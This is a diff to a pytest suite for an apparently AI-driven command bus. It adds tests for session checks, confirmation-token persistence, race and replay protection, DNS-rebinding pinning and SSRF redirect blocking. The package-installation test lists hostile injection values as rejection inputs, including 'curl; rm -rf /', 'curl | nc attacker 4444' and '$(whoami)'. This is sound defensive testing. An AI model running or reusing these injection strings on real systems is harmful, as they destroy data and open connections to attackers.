@@ -19,6 +19,7 @@ import os
 import sys
 import tempfile
 import time
+import socket
 from pathlib import Path
 from unittest.mock import patch, AsyncMock, MagicMock
 
@@ -26,10 +27,12 @@ import pytest
 
 from serein_core.command_bus import (
     CommandBus,
+    CommandResult,
     CommandStatus,
     PermissionTier,
     validate_safe_path,
     APPROVED_APPLICATIONS,
+    PinnedIPResolver,
 )
 from serein_core.safety_layer import SafetyLayer, PermissionLevel, ActionRisk
 from serein_core.config import CoreConfig, AIProviderConfig, mask_secret
@@ -289,11 +292,10 @@ async def test_destructive_action_fails_closed_when_audit_fails():
         dry_run=False
     )
     
-    # Mock broken database audit logger
-    broken_db = MagicMock()
-    broken_db.log_action = AsyncMock(side_effect=IOError("Database disk full / write error"))
-    
-    with patch("serein_core.command_bus.get_database", AsyncMock(return_value=broken_db)):
+    # Use real SQLite database for challenge lifecycle, but mock broken audit logger
+    from serein_core.database import get_database
+    db = await get_database()
+    with patch.object(db, "log_action", AsyncMock(side_effect=IOError("Database disk full / write error"))):
         req = await bus.execute("shutdown")
         token = req.challenge_id
         
@@ -411,3 +413,284 @@ async def test_self_evolution_path_traversal_rejected(tmp_path):
     assert res_traversal.get("success") is False
     assert "error" in res_traversal
     assert "traversal" in res_traversal["error"].lower()
+
+
+# =========================================================================
+# 12. Authenticated Session Enforcement Tests
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_missing_or_invalid_authenticated_sessions():
+    """When require_session is enabled, unauthenticated or forged sessions must be denied."""
+    bus = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
+        require_session=True,
+    )
+    
+    # 1. Missing session
+    res_none = await bus.execute("list_running_apps")
+    assert res_none.status is CommandStatus.DENIED
+    assert "Missing or invalid authenticated session" in res_none.error
+    
+    # 2. Forged invalid session
+    res_bad = await bus.execute("list_running_apps", session_id="forged_sess_token_999")
+    assert res_bad.status is CommandStatus.DENIED
+    assert "Missing or invalid authenticated session" in res_bad.error
+    
+    # 3. Valid authenticated session from SecurityManager
+    from serein_core.auth import security_manager
+    test_user = f"user_{int(time.time())}"
+    security_manager.register_user(test_user, "SecurePass123!", role="admin", age_confirmed=True)
+    sess = security_manager.authenticate(test_user, "SecurePass123!")
+    assert sess is not None
+    
+    res_valid = await bus.execute("list_running_apps", session_id=sess.session_token)
+    assert res_valid.success is True
+    assert "session" not in (res_valid.error or "").lower()
+
+
+# =========================================================================
+# 13. Persistent SQLite Challenges Across Process Restart
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_challenge_persistence_across_process_restart(tmp_path):
+    """Confirmation challenges must survive process restart in persistent SQLite."""
+    db_file = tmp_path / "persistent_challenges.db"
+    db1 = Database(path=db_file)
+    await db1.connect()
+    
+    bus1 = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
+        database=db1,
+    )
+    
+    # Create challenge on bus 1
+    req = await bus1.execute("shutdown")
+    token = req.challenge_id
+    assert token is not None
+    
+    # Simulate process termination: Bus 1 is discarded, fresh Bus 2 connects to DB file
+    db2 = Database(path=db_file)
+    await db2.connect()
+    bus2 = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
+        database=db2,
+    )
+    
+    # Confirm on Bus 2 using challenge generated on Bus 1
+    conf = await bus2.confirm(token, approved=True)
+    assert conf.success is True
+    assert conf.result.get("action") == "shutdown"
+    
+    await db1.close()
+    await db2.close()
+
+
+# =========================================================================
+# 14. Concurrent Confirmation Race Protection
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_concurrent_confirmation_race_protection(tmp_path):
+    """Concurrent attempts to consume the same confirmation challenge must allow exactly one success."""
+    db_file = tmp_path / "race_challenges.db"
+    db = Database(path=db_file)
+    await db.connect()
+    
+    bus = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
+        database=db,
+    )
+    
+    req = await bus.execute("shutdown")
+    token = req.challenge_id
+    assert token is not None
+    
+    # Launch 5 concurrent coroutines racing to confirm the exact same challenge token
+    results = await asyncio.gather(
+        bus.confirm(token, approved=True),
+        bus.confirm(token, approved=True),
+        bus.confirm(token, approved=True),
+        bus.confirm(token, approved=True),
+        bus.confirm(token, approved=True),
+        return_exceptions=True
+    )
+    
+    successes = [r for r in results if isinstance(r, CommandResult) and r.success is True]
+    denied = [r for r in results if isinstance(r, CommandResult) and (r.status is CommandStatus.DENIED or r.status is CommandStatus.FAILED)]
+    
+    # Invariant: Exactly one consumer succeeds, all concurrent competitors fail
+    assert len(successes) == 1
+    assert len(denied) == 4
+    
+    await db.close()
+
+
+# =========================================================================
+# 15. Challenge Replay Prevention
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_challenge_replay_after_consumption():
+    """A consumed challenge cannot be replayed via confirm() or direct execute(token)."""
+    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
+    
+    req = await bus.execute("shutdown")
+    token = req.challenge_id
+    
+    # First confirmation succeeds
+    conf1 = await bus.confirm(token, approved=True)
+    assert conf1.success is True
+    
+    # Replay attempt via confirm()
+    conf2 = await bus.confirm(token, approved=True)
+    assert conf2.success is False
+    assert conf2.status is CommandStatus.FAILED
+    assert "already been consumed" in conf2.error
+    
+    # Replay attempt via direct execute()
+    conf3 = await bus.execute("shutdown", confirmation_token=token)
+    assert conf3.success is False
+    assert conf3.status is CommandStatus.DENIED
+    assert "already" in conf3.error.lower() and "consumed" in conf3.error.lower()
+
+
+# =========================================================================
+# 16. DNS Rebinding PinnedIPResolver Verification
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_dns_rebinding_pinned_resolver():
+    """PinnedIPResolver must strictly return only the pinned IP, ignoring secondary DNS changes."""
+    pinned_ip = "93.184.216.34"
+    resolver = PinnedIPResolver(
+        hostname="rebind-test.attacker.com",
+        pinned_ip=pinned_ip,
+        port=443,
+        family=socket.AF_INET
+    )
+    
+    records = await resolver.resolve("rebind-test.attacker.com", 443)
+    assert len(records) == 1
+    assert records[0]["host"] == pinned_ip
+    assert records[0]["hostname"] == "rebind-test.attacker.com"
+
+
+# =========================================================================
+# 17. Manual Redirect Revalidation (SSRF to Localhost/Private Blocked)
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_redirects_to_localhost_or_private_ips_blocked():
+    """Manual redirect loop must inspect destination IP and block redirection to localhost/private IPs."""
+    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE})
+    
+    mock_resp_302 = MagicMock()
+    mock_resp_302.status = 302
+    mock_resp_302.headers = {"Location": "http://127.0.0.1:8000/internal"}
+    mock_resp_302.__aenter__ = AsyncMock(return_value=mock_resp_302)
+    mock_resp_302.__aexit__ = AsyncMock(return_value=None)
+    
+    mock_session = MagicMock()
+    mock_session.request = MagicMock(return_value=mock_resp_302)
+    mock_session.__aenter__ = AsyncMock(return_value=mock_session)
+    mock_session.__aexit__ = AsyncMock(return_value=None)
+    
+    loop = asyncio.get_running_loop()
+    async def mock_getaddrinfo(host, port, proto=0):
+        if host == "127.0.0.1":
+            return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("127.0.0.1", port))]
+        return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("93.184.216.34", port))]
+    
+    with patch("aiohttp.ClientSession", return_value=mock_session):
+        with patch.object(loop, "getaddrinfo", side_effect=mock_getaddrinfo):
+            res = await bus.execute("network_request", {"url": "http://public.example.com/start"})
+            assert res.status is CommandStatus.DENIED
+            assert "SSRF blocked" in res.error
+            assert "127.0.0.1" in res.error
+
+
+# =========================================================================
+# 18. SafetyLayer Denial for Non-Path Actions
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_safetylayer_denial_for_non_path_actions():
+    """SafetyLayer must block non-path actions when required permission is revoked."""
+    safety = SafetyLayer()
+    safety._permissions["internet"] = PermissionLevel.NONE
+    safety._permissions["automation"] = PermissionLevel.NONE
+    
+    bus = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE, PermissionTier.DESTRUCTIVE},
+        safety_layer=safety,
+    )
+    
+    # 1. Internet permission revoked -> network_request denied
+    res_net = await bus.execute("network_request", {"url": "https://example.com"})
+    assert res_net.status is CommandStatus.DENIED
+    assert "Internet access not granted" in res_net.error
+    
+    # 2. Automation permission revoked -> shutdown denied outright
+    res_sys = await bus.execute("shutdown")
+    assert res_sys.status is CommandStatus.DENIED
+    assert "Automation access not granted" in res_sys.error
+
+
+# =========================================================================
+# 19. Safety Revalidation After Confirmation
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_safety_revalidation_after_confirmation():
+    """If permission is revoked after confirmation challenge is generated, revalidation must abort execution."""
+    safety = SafetyLayer()
+    safety._permissions["automation"] = PermissionLevel.WRITE
+    
+    bus = CommandBus(
+        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
+        safety_layer=safety,
+    )
+    
+    # Request confirmation while permission is granted
+    req = await bus.execute("shutdown")
+    token = req.challenge_id
+    assert token is not None
+    
+    # Revoke permission before user/daemon confirms!
+    safety._permissions["automation"] = PermissionLevel.NONE
+    
+    # Confirm attempt must fail at safety revalidation
+    conf = await bus.confirm(token, approved=True)
+    assert conf.success is False
+    assert conf.status is CommandStatus.DENIED
+    assert "Automation access not granted" in conf.error
+
+
+# =========================================================================
+# 20. Package Installation Hardening Tests
+# =========================================================================
+
+@pytest.mark.asyncio
+async def test_package_installation_flag_and_command_injection_rejected():
+    """Hostile package names (flags, separators, shell metachars) must be rejected."""
+    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
+    
+    hostile_pkgs = [
+        "curl; rm -rf /",
+        "curl && echo pwned",
+        "-o /tmp/pwn",
+        "--version",
+        "curl | nc attacker 4444",
+        "../../bin/malicious",
+        "package`id`",
+        "package$(whoami)",
+    ]
+    
+    for bad_pkg in hostile_pkgs:
+        req = await bus.execute("install_package", {"package": bad_pkg})
+        token = req.challenge_id
+        res = await bus.confirm(token, approved=True)
+        assert res.success is False
+        assert "Invalid package name" in res.error or "denied" in str(res.status).lower()
